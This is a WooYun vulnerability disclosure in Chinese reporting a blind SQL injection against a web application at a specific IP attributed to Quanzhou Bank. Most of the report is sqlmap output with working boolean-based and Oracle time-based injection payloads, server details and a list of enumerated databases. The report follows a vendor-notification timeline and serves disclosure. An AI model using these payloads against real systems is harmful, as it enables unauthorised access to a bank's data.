wybug_detail: 漏洞详情 披露状态：   									2014-07-22：	细节已通知厂商并且等待厂商处理中									2014-07-27：	厂商已经确认，细节仅向厂商公开									2014-08-06：	细节向核心白帽子及相关领域专家公开									2014-08-16：	细节向普通白帽子公开									2014-08-26：	细节向实习白帽子公开									2014-09-05：	细节向公众公开  简要描述： 就一盲注 详细说明：  http://61.154.102.86/mweb/ShowCityMap?City=&Type=0&SearchWord= (GET)注入  SearchWord= sqlmap identified the following injection points with a total of 431 HTTP(s) requests:---Place: GETParameter: SearchWord    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: City=&Type=0&SearchWord=%' AND 2841=2841 AND '%'='    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: City=&Type=0&SearchWord=%' AND 4079=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(83)||CHR(116)||CHR(98),5) AND '%'='    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)---web application technology: Apache, Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: SearchWord    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: City=&Type=0&SearchWord=%' AND 2841=2841 AND '%'='    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: City=&Type=0&SearchWord=%' AND 4079=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(83)||CHR(116)||CHR(98),5) AND '%'='    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)---web application technology: Apache, Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oracleavailable databases [24]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] PM[*] QZBANK[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDBsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: SearchWord    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: City=&Type=0&SearchWord=%' AND 2841=2841 AND '%'='    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: City=&Type=0&SearchWord=%' AND 4079=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(83)||CHR(116)||CHR(98),5) AND '%'='---web application technology: Apache, Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oracle   漏洞证明：  泉州银行   我就跑个库吧 实在是太慢了。。。   这个银行貌似没有硬件设备      修复方案：  你们会   版权声明：转载请注明来源 乐乐、@乌云
